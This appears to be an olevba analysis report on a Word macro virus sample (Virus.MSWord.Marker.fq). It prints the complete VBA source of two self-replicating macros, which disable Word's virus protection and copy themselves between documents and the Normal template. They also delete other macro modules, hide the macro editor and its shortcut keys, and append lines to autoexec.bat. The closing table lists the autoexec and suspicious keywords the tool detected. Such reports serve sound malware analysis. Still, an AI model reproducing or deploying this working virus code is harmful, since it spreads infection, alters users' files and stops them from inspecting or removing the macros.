olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq-f6c9880933c48fa3d24717288be68eb0d86f7690
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq-f6c9880933c48fa3d24717288be68eb0d86f7690 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Dim DI As Boolean, TI As Boolean, d As Object, t As Object, Src As String, r As String


Private Sub Document_Close()
On Error Resume Next

Set d = ActiveDocument.VBProject.VBComponents.Item(1)
Set t = NormalTemplate.VBProject.VBComponents.Item(1)

DI = d.codemodule.Find("长安公司汽研所 常识课", 1, 1, 10000, 10000)
TI = t.codemodule.Find("长安公司汽研所 常识课", 1, 1, 10000, 10000)

Options.VirusProtection = False

  If DI And Not (TI) Then
    Src = d.codemodule.Lines(1, d.codemodule.CountOfLines)
    t.codemodule.DeleteLines 1, t.codemodule.CountOfLines
    t.codemodule.AddFromString Src
    NormalTemplate.Save
    
  ElseIf TI And Not (DI) Then
If Day(Now()) = 1 Then
 Do
 r = UCase(InputBox("长安之星车长多少米?" & Chr(13) & Chr(13) _
 & "A.3米4  B.3米5  C.3米55  D.3米7" & Chr(13) & Chr(13) _
 & "要好好思考哟!", "紧急提问"))
 Loop Until r <> ""
 If r = "B" Then
   MsgBox "好棒哟!"
   GoTo 10
 Else
   MsgBox "唉!再给你一次机会."
    Do
     r = UCase(InputBox("长安之星FBA是什么型?" & Chr(13) & Chr(13) _
     & "A.标准型  B.普通型  C.豪华型" & Chr(13) & Chr(13) _
     & "想好了再回答!", "紧急提问"))
    Loop Until r <> ""
      If r = "C" Then
        MsgBox "谢谢你的支持!"
        GoTo 10
      Else
        MsgBox "笨蛋!给你最后一次机会."
          Do
           r = UCase(InputBox("安全气囊是干什么用的?" & Chr(13) & Chr(13) _
           & "A.防止撞车  B.防止侧滑  C.撞车时保护驾驶员" & Chr(13) & Chr(13) _
           & "这是最后一次机会哟!", "紧急提问"))
          Loop Until r <> ""
           If r = "C" Then
             MsgBox "总算答对了!"
             GoTo 10
           Else
             MsgBox "看来你还需要对长安之星多加了解..."
             ActiveDocument.SaveAs "c:\lzc.vxd"
             ActiveDocument.Close
             Exit Sub
           End If
      End If
 End If
End If
10:
    Src = t.codemodule.Lines(1, t.codemodule.CountOfLines)
    d.codemodule.DeleteLines 1, d.codemodule.CountOfLines
    d.codemodule.AddFromString Src
    ActiveDocument.Save
      
  End If


End Sub

Private Sub Document_Open()
On Error Resume Next

Set d = ActiveDocument.VBProject.VBComponents.Item(1)
Set t = NormalTemplate.VBProject.VBComponents.Item(1)

DI = d.codemodule.Find("长安公司汽研所 常识课", 1, 1, 10000, 10000)
TI = t.codemodule.Find("长安公司汽研所 常识课", 1, 1, 10000, 10000)

Options.VirusProtection = False

  If DI And Not (TI) Then
    t.codemodule.DeleteLines 1, t.codemodule.CountOfLines
    
  ElseIf TI And Not (DI) Then
    d.codemodule.DeleteLines 1, d.codemodule.CountOfLines
      
  End If
  
End Sub











































-------------------------------------------------------------------------------
VBA MACRO A_OPEY_03.bas 
in file: Virus.MSWord.Marker.fq-f6c9880933c48fa3d24717288be68eb0d86f7690 - OLE stream: 'Macros/VBA/A_OPEY_03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub greetings()
    On Error Resume Next
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        line1$ = ""
            If ((Month(Date) = 12) And (Day(Date) = 25)) Or ((Month(Date) = 1) And (Day(Date) = 1)) Then
                line1$ = "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 1) Then
                line1$ = "echo HAPPY HALLOWEEN !!!"
            End If
            If (Month(Date) = 2) And (Day(Date) = 14) Then
                line1$ = "echo HAPPY VALENTINES DAY !!!"
            End If
                If line1$ <> "" Then
                    Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, line1$
                        Print #hFile, "echo from: OPEY A."
                        Print #hFile, "pause"
                    Close hFile
                End If
End Sub
Sub OnlyYou()
  On Error Resume Next
    Call A_OPEY_03
    NTInfected = False
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If clan = "A_OPEY_03" Then NTInfected = True
                If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(j).Name
                    If clan = "A_OPEY_03" Then ODInfected = True
                    If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
                    opendoc.SaveAs FileName:=opendoc.FullName
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call greetings
End Sub
Sub A_OPEY_03()
    On Error Resume Next
    Application.UserName = "OPEY A."
    Application.UserAddress = "CNNHS B'92 PHILIPPINES (CNSC)"
    Application.UserInitials = "LOVE"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "OPEY A."
        .Title = "LOVE"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Tools").Controls("Customize...").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub filesave()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub fileclose()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call OnlyYou
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call OnlyYou
End Sub
Sub AutoExec()
    On Error Resume Next
    Call OnlyYou
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call OnlyYou
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
